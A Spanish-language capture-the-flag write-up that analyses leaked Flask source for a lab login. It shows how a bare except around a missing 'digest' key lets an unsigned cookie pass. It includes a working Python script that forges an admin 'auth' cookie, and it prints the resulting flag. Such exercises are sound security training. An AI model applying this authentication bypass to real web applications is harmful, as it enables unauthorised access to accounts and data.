# Ejercicio 6

Accediendo a http://143.0.100.198:5001/, vemos un sitio para logearnos. Probamos los ataques basicos (admin: admin, sqlinjection, y demas)

Despues use el programa ZAP para mirar los links de la pagina, y encontre que podia acceder a `robots.txt`, oh sorpresa nos muestra un codigo en python que pareciera ser del servidor

Analizando el login vemos por ejemplo:

```
@app.route("/login", methods=["POST"])
def login():

    user = request.form.get("user", "")
    password = request.form.get("password", "")

    if (
        user != "hacker"
        or hashlib.sha512(bytes(password, "ascii")).digest()
        != b"hackshackshackshackshackshackshackshackshackshackshackshackshack"
    ):
        return abort(403)
    return do_login(user, password, True)
```

Ok, solo podemos acceder con el user `hacker` y ademas tenemos que pasar una password que genere tal digesto... Habra algo mas facil? Supongamos que estamos logeados, como hace el servidor para darnos datos?


```
@app.route("/")
def index():

    ok, cookie = load_cookie()
    if not ok:
        return abort(403)

    return render_template(
        "index.html",
        user=cookie.get("user", None),
        admin=cookie.get("admin", None),
        flag=FLAG,
    )
```

Bien, entonces el servidor intenta loader una cookie, y se fija si puede o no. Si no puede, 403, sino nos devuelve la pagina con seteando la FLAG, user y admin. Podremos usar la cookie? Veamos como se carga

```
def load_cookie():

    cookie = {}
    auth = request.cookies.get("auth")
    if auth:
        try:
            cookie = json.loads(binascii.unhexlify(auth).decode("utf8"))
            digest = cookie.pop("digest")

            if (
                digest
                != hashlib.sha512(
                    app.secret_key + bytes(json.dumps(cookie, sort_keys=True), "ascii")
                ).hexdigest()
            ):
                return False, {}
        except:
            pass

    return True, cookie
```

Empezamos con una cookie vacia, cargamos la cookie 'auth', desempacamos lo que tenga adentro y nos guardamos ese JSON. Luego de esto tomamos la entrada 'digest', y si no la tenemos? KeyError!! Salimos del `try-except`, devolvemos (True, cookie) Nice

Entonces la estrategia es clara, aqui dejo el codigo que lo lleva a la practica

```
import requests, json, binascii

cookies = {'user': 'pepe', 'admin': True}

cookie_value = binascii.hexlify(json.dumps(cookies).encode('utf8'))

real_cookie = {'auth': cookie_value.decode('utf8')}

r = requests.get('http://143.0.100.198:5001/', cookies=real_cookie)

print(r.text)
```

FLAG = flag{ThIs_Even_PaSsED_c0d3_rewVIEW}